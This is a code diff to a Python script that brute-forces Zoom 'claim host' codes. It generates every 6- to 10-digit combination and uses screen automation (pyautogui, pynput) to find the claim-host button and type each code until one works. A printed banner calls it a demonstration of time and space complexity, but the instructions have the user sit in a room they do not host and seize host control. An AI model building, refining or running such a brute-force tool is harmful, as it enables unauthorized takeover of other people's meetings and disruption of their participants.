@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import itertools
 import pyautogui
 import pyperclip
@@ -6,42 +8,53 @@ import time
 import timeit
 import random
 import schedule
+import sys
 from pynput.mouse import Button, Controller
 
 pyautogui.FAILSAFE = True
-
 mouse = Controller()
-
-print('Creating key list...')
 master_key = [] #master list of combinations
 
-# def wait_message():
-#     print('working..')
-#
-# schedule.every(5).seconds.do(wait_message)
-#
-# while len(master_key) == 0:
-#     schedule.run_pending()
+print('\n')
 
-# each comb is a list of all n digit numbers based on 'repeat' value.
+print("""PLEASE READ: This program demonstrates time and space complexity by generating all possible Zoom host codes. In order for the program to work properly, you need to:
 
-#comb3 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=3))
-#comb6 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=6))
-#comb7 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=7))
-comb8 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=8))
-#comb9 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=9))
-#comb10 = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=10))
+--Be in a Zoom Room (preferably empty), of which you have access but are not the host.
 
-final_list = comb8 #+ comb7 + comb8 + comb9 + comb10
+--Click on the 'participants' icon in Zoom, a sidebar will appear and you should see a 'claim host' button.
 
-print('List complete!')
+The program will search your screen for the claim host button and try to input all code combinations. If you want to stop the program hit control-c or move your mouse to the upper left corner of your screen. This is for demonstration purposes only.""")
 
-for i in final_list:
-    #each number is a list of digits, this function joins
-    #each number list to create a list of numbers, then
-    #appends the number into the master_key list.
-    res = ''.join(str(x) for x in i)
-    master_key.append(res)
+print('\n')
+
+digit_query = input('Enter a number between 6 and 10 (hit control-c to terminate the program if it stalls): ')
+
+def generate_combinations(digits):
+    print('Creating key list...')
+    combos = list(itertools.product([0,1,2,3,4,5,6,7,8,9], repeat=digits))
+    for i in combos:
+        res = ''.join(str(x) for x in i)
+        master_key.append(res)
+
+if 6 <= int(digit_query) <= 7:
+    print('This should take less than a minute.')
+    generate_combinations(int(digit_query))
+    print('List complete!')
+elif 8 <= int(digit_query) <= 10:
+    warning = input('You are about to generate between 10 Million and 1 Billion numbers on your machine, do you wish to continue? [Y/N] ')
+    if warning == 'Y' or warning == 'y':
+        generate_combinations(int(digit_query))
+        print('List complete!')
+    elif warning == 'N' or warning == 'n':
+        print('Bye :)')
+        sys.exit()
+    else:
+        print('Wrong input..')
+        sys.exit()
+else:
+    print('Bye :)')
+    sys.exit()
+
 
 print("The list contains {} items.".format(len(master_key))) # print the length of the list.
 nex = iter(master_key) # turn master list into an iterator so we can grab
@@ -55,17 +68,29 @@ pyautogui.click(claim_point.x*.5, claim_point.y*.5)
 
 time.sleep(.2)
 
+def find_input():
+    try:
+        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/inputbox.png', confidence=.9)
+        pyautogui.click(input_box_x*.5, input_box_y*.5)
+    except:
+        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/grayinput.png', confidence=.9)
+        pyautogui.click(input_box_x*.5, input_box_y*.5)
+
+find_input()
+
+
+
 def click_claim():
     '''
     Click the blue claim host button that appears after
     numbers are entered.
     '''
     try:
-        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
-        pyautogui.click(input_box_x*.5, input_box_y*.5)
+        claim_x, claim_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
+        pyautogui.click(claim_x*.5, claim_y*.5)
     except:
-        input_box_x, input_box_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
-        pyautogui.click(input_box_x*.5, input_box_y*.5)
+        claim_x, claim_y = pyautogui.locateCenterOnScreen('screen_finds/blueclaimhost.png', confidence=.9, grayscale=True)
+        pyautogui.click(claim_x*.5, claim_y*.5)
 
 # #
 def turn_key(i):
@@ -91,6 +116,7 @@ def test_code(code):
     mouse.click(Button.left, 2)
     pyautogui.press('backspace')
     end = time.time()
-    test_code(nex)
+    for i in master_key:
+        test_code(nex)
 
-#test_code(nex)
+test_code(nex)
